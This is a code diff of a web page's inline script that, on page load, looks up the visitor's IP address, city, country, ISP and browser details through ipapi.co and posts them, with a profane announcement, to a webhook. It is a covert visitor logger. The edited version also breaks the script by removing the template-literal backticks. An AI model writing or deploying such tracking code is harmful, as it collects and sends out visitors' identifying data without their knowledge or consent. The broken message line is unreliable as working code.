@@ -311,24 +311,24 @@ function fadeMatrixEffect(duration = 1500) {
       fetch("https://ipapi.co/json/")
         .then(res => res.json())
         .then(data => {
-           const embed = {
-  = `🌴💤 ɴᴇᴡ ᴍᴏᴛʜᴇʀꜰᴜᴄᴋᴇʀ ᴏᴘᴇɴᴇᴅ ${window.location.href}
+          const message = 🌴💤 ɴᴇᴡ ᴍᴏᴛʜᴇʀꜰᴜᴄᴋᴇʀ ᴏᴘᴇɴᴇᴅ ${window.location.href}
  ɪᴘ: ${data.ip}
  ʟᴏᴄᴀᴛɪᴏɴ: ${data.city}, ${data.region}, ${data.country_name}
  ɪꜱᴘ: ${data.org}
  ʙʀᴏᴡꜱᴇʀ/ᴏꜱ: ${navigator.userAgent}
- ᴛɪᴍᴇ: ${new Date().toLocaleString()}`;
+ ᴛɪᴍᴇ: ${new Date().toLocaleString()};
 
-  fetch(webhookUrl, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ embeds: [embed] })
+          fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: message })
           });
         })
         .catch(err => console.error("Error fetching visitor info:", err));
     </script>
   </body>
 </html>
+
 
 
 
